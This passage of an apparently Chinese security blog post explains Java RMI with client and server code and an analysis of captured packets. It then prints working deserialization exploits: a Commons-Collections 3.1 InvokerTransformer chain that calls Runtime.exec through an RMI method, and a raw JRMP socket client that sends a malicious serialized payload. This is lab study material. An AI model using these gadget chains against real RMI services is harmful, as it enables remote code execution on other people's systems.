class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.patrilic.rmi;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StartService</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">StartService</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String host =<span class="string">"127.0.0.1"</span>;</span><br><span class="line">        String port =<span class="string">"1099"</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            RMIServiceAPI service = <span class="keyword">new</span> RMIService();</span><br><span class="line">            LocateRegistry.createRegistry(Integer.valueOf(port));</span><br><span class="line">            Naming.bind(<span class="string">"rmi://"</span> + host + <span class="string">":"</span> + port + <span class="string">"/RmiService"</span>, service);</span><br><span class="line">            System.out.println(<span class="string">"[INFO]:Success to bind rmi object"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NumberFormatException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (MalformedURLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (AlreadyBoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">StartService();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/RMI.resources/070C8E9A-2382-4FBB-8C5E-AA4559FC649C.png" alt="8c1ada5bab64f273daad336c41307ec6"></p><h3 id="å®¢æˆ·ç«¯"><a href="#å®¢æˆ·ç«¯" class="headerlink" title="å®¢æˆ·ç«¯"></a>å®¢æˆ·ç«¯</h3><p>å’ŒServerç«¯ä¸€æ ·ï¼Œå…ˆæ„é€ ä¸€ä¸ªæ¥å£ç»§æ‰¿Remote<br>æ³¨æ„ï¼Œå¿…é¡»ä½¿ç”¨å’ŒServerç«¯ç›¸åŒçš„packageå’ŒRMIServiceAPIåç§°ï¼Œä¸ç„¶ä¼šæŠ¥é”™<br><img src="/RMI.resources/C68FA7EC-30FF-48B0-AAAA-7612C07D2E5D.png" alt="65111557c3c0a8a7cb0d3a6c57bcc051"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.patrilic.rmi;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">RMIServiceAPI</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">(String a)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ„é€ Clientè°ƒç”¨æœåŠ¡ç«¯çš„helloæ¥å£<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.patrilic.rmi;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient</span> </span>&#123;</span><br><span class="line">   </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">linkHello</span><span class="params">(String a)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        String host = <span class="string">"127.0.0.1"</span>;</span><br><span class="line">        String port = <span class="string">"1099"</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Remote remote = Naming.lookup(<span class="string">"rmi://"</span> + host + <span class="string">":"</span> + port</span><br><span class="line">                    + <span class="string">"/RmiService"</span>);</span><br><span class="line">            <span class="keyword">if</span> (remote <span class="keyword">instanceof</span> RMIServiceAPI) &#123;</span><br><span class="line">            RMIServiceAPI rmiService = (RMIServiceAPI) remote;</span><br><span class="line">                String result = rmiService.hello(a);</span><br><span class="line">                System.out.println(result);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotBoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (MalformedURLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">                    </span><br><span class="line">                    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            linkHello(<span class="string">"Patrilic"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/RMI.resources/FF0E49D9-40AB-42D1-AB32-CC78ED386B34.png" alt="e7a7843a05c493670904bec48a52dd32"></p><p><img src="/RMI.resources/DA8DEF68-8A20-41C1-989F-6330EA8858C8.png" alt="6b731c857e38846e526b2c60d7ec4de7"></p><h2 id="0x03-RMIé€šè®¯æµç¨‹"><a href="#0x03-RMIé€šè®¯æµç¨‹" class="headerlink" title="0x03 RMIé€šè®¯æµç¨‹"></a>0x03 RMIé€šè®¯æµç¨‹</h2><p>åœ¨RMIClientå¯¹Serverç«¯è¿›è¡Œlookupæ“ä½œæ—¶ï¼Œç”¨WiresharkæŒ‡å®šlo0ç½‘å¡æŠ“åŒ…<br><img src="/RMI.resources/8F637EE5-28A8-426D-9184-2714902E28CC.png" alt="b31c0000a77bc703a77d894cb5307fa2"></p><h3 id="ç¬¬ä¸€éƒ¨åˆ†"><a href="#ç¬¬ä¸€éƒ¨åˆ†" class="headerlink" title="ç¬¬ä¸€éƒ¨åˆ†"></a>ç¬¬ä¸€éƒ¨åˆ†</h3><p><code>AC ED 00 05æ˜¯å¸¸è§çš„javaååºåˆ—åŒ–16è¿›åˆ¶ç‰¹å¾</code><br>Clientè¿æ¥Registryä¸­å¿ƒçš„1099ç«¯å£ï¼Œ å»ºç«‹é€šè®¯</p><p>Clienté€šè¿‡JRMI,CallæŸ¥è¯¢éœ€è¦è°ƒç”¨çš„å‡½æ•°çš„è¿œç¨‹å¼•ç”¨ï¼Œæ³¨å†Œä¸­å¿ƒé€šè¿‡JRMI,ReturnDataè¿”å›RMIçš„è°ƒç”¨ç±»ä»¥åŠServerçš„ipå’Œç«¯å£<br><img src="/RMI.resources/EAEC49FD-30D0-412D-A543-41F7549A49F9.png" alt="dfc817077210f67c32b3fe540aedadad"><br><img src="/RMI.resources/19124785-F9D5-4DEB-BC94-343041F5296A.png" alt="d35b415893196e0d4db62aa7c39f3bbc"></p><h3 id="ç¬¬äºŒéƒ¨åˆ†"><a href="#ç¬¬äºŒéƒ¨åˆ†" class="headerlink" title="ç¬¬äºŒéƒ¨åˆ†"></a>ç¬¬äºŒéƒ¨åˆ†</h3><p>é€šè¿‡æ³¨å†Œä¸­å¿ƒæä¾›çš„Serverçš„ipå’Œç«¯å£ï¼Œè¿›è€ŒClientå’ŒServerè¿›è¡Œè¿æ¥<br><img src="/RMI.resources/28786E0B-E419-4AE8-816A-EE1B0E0E4849.png" alt="cb81bc50a01de1ba631ea28bbf0a7154"></p><h3 id="ç¬¬ä¸‰éƒ¨åˆ†"><a href="#ç¬¬ä¸‰éƒ¨åˆ†" class="headerlink" title="ç¬¬ä¸‰éƒ¨åˆ†"></a>ç¬¬ä¸‰éƒ¨åˆ†</h3><p>å†è¿›è¡Œä¸€æ¬¡JRMIï¼ŒClientè¿æ¥Registryä¸­å¿ƒçš„1099ç«¯å£<br><img src="/RMI.resources/3BDA857B-8EBD-4F63-9785-B561A91323C3.png" alt="3ffbe6a7d29b25c5da1cb85e015fb383"><br>åº”è¯¥æ˜¯åœ¨ç¡®è®¤è°ƒç”¨ç±»éœ€è¦çš„ä¸œè¥¿<br><img src="/RMI.resources/7520C484-1766-4070-BFB0-F65E9A3CF749.png" alt="8cdb8a02662cc9ff538f324e94783398"></p><h3 id="ç¬¬å››éƒ¨åˆ†"><a href="#ç¬¬å››éƒ¨åˆ†" class="headerlink" title="ç¬¬å››éƒ¨åˆ†"></a>ç¬¬å››éƒ¨åˆ†</h3><p><img src="/RMI.resources/FFE19B48-D341-4A79-A5D5-017BF5A3A282.png" alt="44f1b0bf06d39339ba796717c14d9e78"><br><img src="/RMI.resources/6FA71D21-0855-430D-B3A6-52F4BF1BD0D7.png" alt="f025b99348ba11c47a8201ce713e9020"></p><p>è¿”å›è°ƒç”¨ç»“æœ</p><h2 id="0x04-RMIååºåˆ—åŒ–æ¼æ´"><a href="#0x04-RMIååºåˆ—åŒ–æ¼æ´" class="headerlink" title="0x04 RMIååºåˆ—åŒ–æ¼æ´"></a>0x04 RMIååºåˆ—åŒ–æ¼æ´</h2><p>ä»ä¹‹å‰çš„æµç¨‹å›¾å°±å¯ä»¥å‘ç°ï¼Œé€šè®¯è¿‡ç¨‹ä¸­çš„æ‰€æœ‰å¯¹è±¡éƒ½æ˜¯åºåˆ—åŒ–ä¹‹åä¼ è¾“ï¼Œé‚£ä¹ˆå°±å¿…å®šæœ‰ååºåˆ—åŒ–æ“ä½œã€‚</p><p>è¿™é‡Œåˆ©ç”¨Common-Collections-3.1çš„ååºåˆ—åŒ–</p><p>ä»£ç æ¥è‡ª<a href="https://xz.aliyun.com/t/6660#toc-6" target="_blank" rel="noopener">https://xz.aliyun.com/t/6660#toc-6</a><br>Server<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.patrilic.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">name</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">say</span><span class="params">(String say)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">dowork</span><span class="params">(Object work)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">UserImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">UserImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>&#123;</span><br><span class="line">            <span class="keyword">super</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">name</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> name;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">say</span><span class="params">(String say)</span> <span class="keyword">throws</span>  RemoteException</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"you speak"</span> + say);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">dowork</span><span class="params">(Object work)</span> <span class="keyword">throws</span>  RemoteException</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"your work is "</span> + work);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String url = <span class="string">"rmi://127.0.0.1:1099/User"</span>;</span><br><span class="line">        UserImpl user = <span class="keyword">new</span> UserImpl();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.bind(url,user);</span><br><span class="line">        System.out.println(<span class="string">"the rmi is running ..."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>Client<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.patrilic.rmi;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="comment">//import com.patrilic.rmi.Server;</span></span><br><span class="line"><span class="keyword">import</span> com.patrilic.rmi.Server.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String url = <span class="string">"rmi://127.0.0.1:1099/User"</span>;</span><br><span class="line">        User userClient = (User)Naming.lookup(url);</span><br><span class="line"></span><br><span class="line">        System.out.println(userClient.name(<span class="string">"lala"</span>));</span><br><span class="line">        userClient.say(<span class="string">"world"</span>);</span><br><span class="line">        userClient.dowork(getpayload());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getpayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"open -a /System/Applications/Calculator.app"</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        map.put(<span class="string">"value"</span>, <span class="string">"lala"</span>);</span><br><span class="line">        Map transformedMap = TransformedMap.decorate(map, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        Class cl = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object instance = ctor.newInstance(Target.class, transformedMap);</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/RMI.resources/94649F71-BD5F-4501-8533-05186989EF5E.png" alt="fd8180230a402fa03b6d9123c9a54cd8"></p><p>Githubæœ‰ä¸ªé¡¹ç›®<a href="https://github.com/NickstaDB/BaRMIe" target="_blank" rel="noopener">BaRMIe</a><br><img src="/RMI.resources/91418487-960E-40F2-84CC-127BFF0F8632.png" alt="4068e65bae9aa6e9ee8435025c76b6eb"></p><h2 id="0x05-JRMP"><a href="#0x05-JRMP" class="headerlink" title="0x05 JRMP"></a>0x05 JRMP</h2><p><code>Javaè¿œç¨‹æ–¹æ³•åè®®ï¼ˆè‹±è¯­ï¼šJava Remote Method Protocolï¼ŒJRMPï¼‰æ˜¯ç‰¹å®šäºJavaæŠ€æœ¯çš„ã€ç”¨äºæŸ¥æ‰¾å’Œå¼•ç”¨è¿œç¨‹å¯¹è±¡çš„åè®®ã€‚è¿™æ˜¯è¿è¡Œåœ¨Javaè¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼ˆRMIï¼‰ä¹‹ä¸‹ã€TCP/IPä¹‹ä¸Šçš„çº¿è·¯å±‚åè®®</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.patrilic.rmi;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.MarshalOutputStream;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.TransportConstants;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.DataOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JRMI</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (args.length == <span class="number">0</span>) &#123;</span><br><span class="line">         args = <span class="keyword">new</span> String[]&#123;<span class="string">"127.0.0.1"</span>, String.valueOf(<span class="string">"9527"</span>), <span class="string">"open -a Calculator.app"</span>&#125;;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">final</span> String host = args[<span class="number">0</span>];</span><br><span class="line">      <span class="keyword">final</span> <span class="keyword">int</span> port = Integer.parseInt(args[<span class="number">1</span>]);</span><br><span class="line">      <span class="keyword">final</span> String command = args[<span class="number">2</span>];</span><br><span class="line">      Socket socket = <span class="keyword">null</span>;</span><br><span class="line">      OutputStream out = <span class="keyword">null</span>;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         Object payloadObject = RMIExploit.genPayload(command);</span><br><span class="line">         socket = <span class="keyword">new</span> Socket(<span class="string">"127.0.0.1"</span>, <span class="number">9527</span>);</span><br><span class="line">         socket.setKeepAlive(<span class="keyword">true</span>);</span><br><span class="line">         socket.setTcpNoDelay(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">         <span class="comment">// è·å–Socketçš„è¾“å‡ºæµå¯¹è±¡</span></span><br><span class="line">         out = socket.getOutputStream();</span><br><span class="line"></span><br><span class="line">         <span class="comment">// å°†Socketçš„è¾“å‡ºæµè½¬æ¢æˆDataOutputStreamå¯¹è±¡</span></span><br><span class="line">         DataOutputStream dos = <span class="keyword">new</span> DataOutputStream(out);</span><br><span class="line"></span><br><span class="line">         <span class="comment">// åˆ›å»ºMarshalOutputStreamå¯¹è±¡</span></span><br><span class="line">         ObjectOutputStream baos = <span class="keyword">new</span> MarshalOutputStream(dos);</span><br><span class="line"></span><br><span class="line">         <span class="comment">// å‘è¿œç¨‹RMIæœåŠ¡ç«¯Socketå†™å…¥RMIåè®®å¹¶é€šè¿‡JRMPä¼ è¾“Payloadåºåˆ—åŒ–å¯¹è±¡</span></span><br><span class="line">         dos.writeInt(TransportConstants.Magic);<span class="comment">// é­”æ•°</span></span><br><span class="line">         dos.writeShort(TransportConstants.Version);<span class="comment">// ç‰ˆæœ¬</span></span><br><span class="line">         dos.writeByte(TransportConstants.SingleOpProtocol);<span class="comment">// åè®®ç±»å‹</span></span><br><span class="line">         dos.write(TransportConstants.Call);<span class="comment">// RMIè°ƒç”¨æŒ‡ä»¤</span></span><br><span class="line">         baos.writeLong(<span class="number">2</span>); <span class="comment">// DGC</span></span><br><span class="line">         baos.writeInt(<span class="number">0</span>);</span><br><span class="line">         baos.writeLong(<span class="number">0</span>);</span><br><span class="line">         baos.writeShort(<span class="number">0</span>);</span><br><span class="line">         baos.writeInt(<span class="number">1</span>); <span class="comment">// dirty</span></span><br><span class="line">         baos.writeLong(<span class="number">1L</span>);<span class="comment">// æ¥å£Hashå€¼</span></span><br><span class="line"></span><br><span class="line">         <span class="comment">// å†™å…¥æ¶æ„çš„åºåˆ—åŒ–å¯¹è±¡</span></span><br><span class="line">         baos.writeObject(payloadObject);</span><br><span class="line"></span><br><span class="line">         dos.flush();</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">         e.printStackTrace();</span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">         <span class="comment">// å…³é—­Socketè¾“å‡ºæµ</span></span><br><span class="line">         <span class="keyword">if</span> (out != <span class="keyword">null</span>) &#123;</span><br><span class="line">            out.close();</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="comment">// å…³é—­Socketè¿æ¥</span></span><br><span class="line">         <span class="keyword">if</span> (socket != <span class="keyword">null</span>) &#123;</span><br><span class="line">            socket.close();</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x06-ç›¸å…³é“¾æ¥"><a href="#0x06-ç›¸å…³é“¾æ¥" class="headerlink" title="0x06 ç›¸å…³é“¾æ¥"></a>0x06 ç›¸å…³é“¾æ¥</h2><p><a href="https://javasec.org/javase/RMI/" target="_blank" rel="noopener">https://javasec.org/javase/RMI/</a><br><a href="https://xz.aliyun.com/t/7079" target="_blank" rel="noopener">https://xz.aliyun.com/t/7079</a><br><a href="https://xz.aliyun.com/t/2223" target="_blank" rel="noopener">https://xz.aliyun.com/t/2223</a><br><a href="https://xz.aliyun.com/t/6660#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/6660#toc-0</a><br><a 